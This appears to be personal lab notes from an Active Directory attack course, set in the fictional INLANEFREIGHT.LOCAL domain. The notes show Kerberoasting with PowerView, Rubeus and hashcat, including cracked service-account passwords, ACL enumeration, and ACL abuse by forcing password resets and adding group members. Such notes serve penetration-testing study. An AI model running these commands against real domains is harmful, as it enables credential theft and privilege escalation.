bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>hashcat (v6.1.1) starting...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca42506149470ea972fccbab40300b97150d62f456891bf26f1828d3f47c4ead032a7d3a415a140c32c416b8d3b1ef6ed95911b30c3979716bda6f61c946e4314f046890bc09a017f2f4003852ef1181cec075205c460aea0830d9a3a29b11e7c94fffca0dba76ba3ba1f0577306555b2cbdf036c5824ccffa1c880e2196c0432bc46da9695a925d47febd3be10104dd86877c90e02cb0113a38ea4b7e4483a7b18b15587524d236d5c67175f7142cc75b1ba05b2395e4e85262365044d272876f500cb511001850a390880d824aec2c452c727beab71f56d8189440ecc3915c148a38eac06dbd27fe6817ffb1404c1f:database!
</span></span><span style=display:flex><span>                                                 
</span></span><span style=display:flex><span>Session..........: hashcat
</span></span><span style=display:flex><span>Status...........: Cracked
</span></span><span style=display:flex><span>Hash.Name........: Kerberos 5, etype 23, TGS-REP
</span></span><span style=display:flex><span>Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f
</span></span><span style=display:flex><span>Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
</span></span><span style=display:flex><span>Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)
</span></span><span style=display:flex><span>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
</span></span><span style=display:flex><span>Guess.Queue......: 1/1 (100.00%)
</span></span><span style=display:flex><span>Speed.#1.........:   821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
</span></span><span style=display:flex><span>Recovered........: 1/1 (100.00%) Digests
</span></span><span style=display:flex><span>Progress.........: 8765440/14344386 (61.11%)
</span></span><span style=display:flex><span>Rejected.........: 0/8765440 (0.00%)
</span></span><span style=display:flex><span>Restore.Point....: 8749056/14344386 (60.99%)
</span></span><span style=display:flex><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span><span style=display:flex><span>Candidates.#1....: davius07 -&gt; darten170
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Started: Tue Feb 15 17:44:49 2022
</span></span></code></pre></div><p>Â </p><h1 id=kerberoasting---from-windows>Kerberoasting - from Windows</h1><h2 id=automated--tool-based-route>Automated / Tool Based Route</h2><p>iwr <a href=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 rel=external>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a> -OutFile PowerView.ps1</p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module .\PowerView.ps1
PS C:\local&gt; Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmoni</code></pre></div><p>Â </p><p>Â </p><h4 id=using-powerview-to-target-a-specific-user>Using PowerView to Target a Specific User</h4><p>Kerberoasting - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001
                       376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177
                       AB4FF3CE724FB0809CDA9E30703EDDE93</code></pre></div><p>Â </p><p>Â </p><h4 id=viewing-the-contents-of-the-csv-file>Viewing the Contents of the .CSV File</h4><p>Kerberoasting - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; cat .\ilfreight_tgs.csv

&#34;SamAccountName&#34;,&#34;DistinguishedName&#34;,&#34;ServicePrincipalName&#34;,&#34;TicketByteHexStream&#34;,&#34;Hash&#34;
&#34;adfs&#34;,&#34;CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&#34;,&#34;adfsconnect/azure01.inlanefreight.local&#34;,,&#34;$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1

&lt;SNIP&gt;</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=using-rubeus>Using Rubeus</h4><ul><li>Performing Kerberoasting and outputting hashes to a file</li><li>Using alternate credentials</li><li>Performing Kerberoasting combined with a pass-the-ticket attack</li><li>Performing &ldquo;opsec&rdquo; Kerberoasting to filter out AES-enabled accounts</li><li>Requesting tickets for accounts passwords set between a specific date range</li><li>Placing a limit on the number of tickets requested</li><li>Performing AES Kerberoasting</li></ul><h4 id=using-the-stats-flag>Using the /stats Flag</h4><p>Kerberoasting - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\Rubeus.exe kerberoast /stats

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path &#39;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#39; for &#39;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#39;

[*] Total kerberoastable users : 9


 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------</code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path &#39;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#39; for &#39;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#39;

[*] Total kerberoastable users : 1


[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash</code></pre></div><p>Â </p><p>Â </p><h4 id=using-the-nowrap-flag>Using the /nowrap Flag</h4><p>Kerberoasting - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\Rubeus.exe kerberoast /ldapfilter:&#39;admincount=1&#39; /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>hashcat (v6.1.1) starting...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;64bea80dc3608b6c8c14f244cbaa083443eb59d9ef3599fca72c6997c824b87cf7f7ef6621b3eaa5aa0119177fc480a20b82203081609e42748920274febb94c3826d57c78ad93f04400dc9626cf978225c51a889224e3ed9e3bfdf6a4d6998c16d414947f9e157cb1594b268be470d6fb489c2c6c56d2ad564959c5:welcome1$
</span></span><span style=display:flex><span>                                                 
</span></span><span style=display:flex><span>Session..........: hashcat
</span></span><span style=display:flex><span>Status...........: Cracked
</span></span><span style=display:flex><span>Hash.Name........: Kerberos 5, etype 23, TGS-REP
</span></span><span style=display:flex><span>Hash.Target......: $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/ke...4959c5
</span></span><span style=display:flex><span>Time.Started.....: Sun Feb 27 15:36:58 2022 (4 secs)
</span></span><span style=display:flex><span>Time.Estimated...: Sun Feb 27 15:37:02 2022 (0 secs)
</span></span><span style=display:flex><span>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
</span></span><span style=display:flex><span>Guess.Queue......: 1/1 (100.00%)
</span></span><span style=display:flex><span>Speed.#1.........:   693.3 kH/s (5.41ms) @ Accel:
</span></span></code></pre></div><p>Â </p><p>Â </p><p><strong>AES-128/256 CRACKING</strong></p><p>Â </p><h4 id=checking-supported-encryption-types>Checking Supported Encryption Types</h4><p>Kerberoasting - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            24 testspn</code></pre></div><p>Â </p><h4 id=requesting-a-new-ticket>Requesting a New Ticket</h4><p>Kerberoasting - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt;  .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path &#39;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#39; for &#39;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#39;

[*] Total kerberoastable users : 1

[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash                   : $krb5tgs$18$testspn$IN</code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>hashcat (v6.1.1) starting...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Session..........: hashcat
</span></span><span style=display:flex><span>Status...........: Running
</span></span><span style=display:flex><span>Hash.Name........: Kerberos 5, etype 18, TGS-REP
</span></span><span style=display:flex><span>Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53
</span></span><span style=display:flex><span>Time.Started.....: Sun Feb 27 16:07:50 2022 (57 secs)
</span></span><span style=display:flex><span>Time.Estimated...: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs)
</span></span><span style=display:flex><span>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
</span></span><span style=display:flex><span>Guess.Queue......: 1/1 (100.00%)
</span></span><span style=display:flex><span>Speed.#1.........:    10277 H/s (8.99ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
</span></span><span style=display:flex><span>Recovered........: 0/1 (0.00%) Digests
</span></span><span style=display:flex><span>Progress.........: 583680/14344385 (4.07%)
</span></span><span style=display:flex><span>Rejected.........: 0/583680 (0.00%)
</span></span><span style=display:flex><span>Restore.Point....: 583680/14344385 (4.07%)
</span></span><span style=display:flex><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3264-3328
</span></span><span style=display:flex><span>Candidates.#1....: skitzy -&gt; sammy&lt;3
</span></span></code></pre></div><p>Â </p><p>Â </p><p><a href=#R-image-54cf02b3ebfc975d15c03c7e67041b6f class=lightbox-link><img alt=8ce1b8d8a99d637ca06295fcb798ef7c.png class="lazy lightbox figure-image" loading=lazy src=../../resources/8ce1b8d8a99d637ca06295fcb798ef7c.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-54cf02b3ebfc975d15c03c7e67041b6f><img alt=8ce1b8d8a99d637ca06295fcb798ef7c.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/8ce1b8d8a99d637ca06295fcb798ef7c.png></a></p><p>Â </p><p>Â </p><h2 id=access-control-list-acl-overview>Access Control List (ACL) Overview</h2><p><a href=#R-image-7cfaec5785e7b643cd97198467d7ac15 class=lightbox-link><img alt=78292a41235c1e132071d6db86718a8b.png class="lazy lightbox figure-image" loading=lazy src=../../resources/78292a41235c1e132071d6db86718a8b.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-7cfaec5785e7b643cd97198467d7ac15><img alt=78292a41235c1e132071d6db86718a8b.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/78292a41235c1e132071d6db86718a8b.png></a></p><p>Â </p><p>Â </p><h1 id=acl-enumeration>ACL Enumeration</h1><p>Â <strong>powerview</strong></p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Find-InterestingDomainAcl

ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : ab721a53-1e2f-11d0-9819-00aa0040529b
AceFlags                : ContainerInherit
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
IdentityReferenceName   : Exchange Windows Permissions
IdentityReferenceDomain : INLANEFREIGHT.LOCAL
IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
                          Groups,DC=INLANE</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module .\PowerView.ps1
PS C:\local&gt; $sid = Convert-NameToSid wley</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None</code></pre></div><p>Â </p><p>Â </p><p><a href=#R-image-5291d80688124f04767074d81c4a1d69 class=lightbox-link><img alt=03f03b552d32821438c5b2cf6877283c.png class="lazy lightbox figure-image" loading=lazy src=../../resources/03f03b552d32821438c5b2cf6877283c.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-5291d80688124f04767074d81c4a1d69><img alt=03f03b552d32821438c5b2cf6877283c.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/03f03b552d32821438c5b2cf6877283c.png></a></p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; $adunnsid = Convert-NameToSid adunn 
PS C:\local&gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0</code></pre></div><p>Â </p><p>Â <strong>active directorymodule</strong></p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></pre></div><p><strong><a href=#R-image-df43bad2a9ee5d154a40debe2ca76e71 class=lightbox-link><img alt=846b901bdb3d8857a41f53735b0f7579.png class="lazy lightbox figure-image" loading=lazy src=../../resources/846b901bdb3d8857a41f53735b0f7579.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-df43bad2a9ee5d154a40debe2ca76e71><img alt=846b901bdb3d8857a41f53735b0f7579.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/846b901bdb3d8857a41f53735b0f7579.png></a></strong></p><p>Â </p><p>Â </p><p><strong>loop it</strong></p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; foreach($line in [System.IO.File]::ReadLines(&#34;C:\Users\local-student\Desktop\ad_users.txt&#34;)) {get-acl  &#34;AD:\$(Get-ADUser $line)&#34; | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match &#39;INLANEFREIGHT\\wley&#39;}}

Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana 
                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
InheritanceType       : All
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529</code></pre></div><p>Â </p><p><a href=#R-image-cfa6da9fdca17a44b963db1a3e5066bc class=lightbox-link><img alt=a60c3f3b577109719fccee30919d838c.png class="lazy lightbox figure-image" loading=lazy src=../../resources/a60c3f3b577109719fccee30919d838c.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-cfa6da9fdca17a44b963db1a3e5066bc><img alt=a60c3f3b577109719fccee30919d838c.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/a60c3f3b577109719fccee30919d838c.png></a></p><h4 id=investigating-the-help-desk-level-1-group-with-get-domaingroup>Investigating the Help Desk Level 1 Group with Get-DomainGroup</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainGroup -Identity &#34;Help Desk Level 1&#34; | select memberof

memberof                                                                      
--------                                                                      
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=investigating-the-information-technology-group>Investigating the Information Technology Group</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; $itgroupsid = Convert-NameToSid &#34;Information Technology&#34;
PS C:\local&gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=acl-abuse-tactics>ACL Abuse Tactics</h1><ol><li>Use the <code>wley</code> user to change the password for the <code>damundsen</code> user</li></ol><p>ifl wey session is on</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>âœ… Modified Command (no credential needed):
powershell
Copy
Edit
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Verbose</code></pre></div><p>Â </p><p>no session</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; $SecPassword = ConvertTo-SecureString &#39;&lt;PASSWORD HERE&gt;&#39; -AsPlainText -Force
PS C:\local&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#39;INLANEFREIGHT\wley&#39;, $SecPassword)</code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; $damundsenPassword = ConvertTo-SecureString &#39;Pwn3d_by_ACLs!&#39; -AsPlainText -Force</code></pre></div><p>Â </p><h4 id=changing-the-users-password>Changing the User&rsquo;s Password</h4><p>ACL Abuse Tactics</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; cd C:\Tools\
PS C:\local&gt; Import-Module .\PowerView.ps1
PS C:\local&gt; Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user &#39;damundsen&#39;</code></pre></div><p>Â </p><p>Â </p><p>generic write</p><h4 id=adding-damundsen-to-the-help-desk-level-1-group>Adding damundsen to the Help Desk Level 1 Group</h4><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Add-DomainGroupMember -Identity &#39;Help Desk Level 1&#39; -Members &#39;damundsen&#39; -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
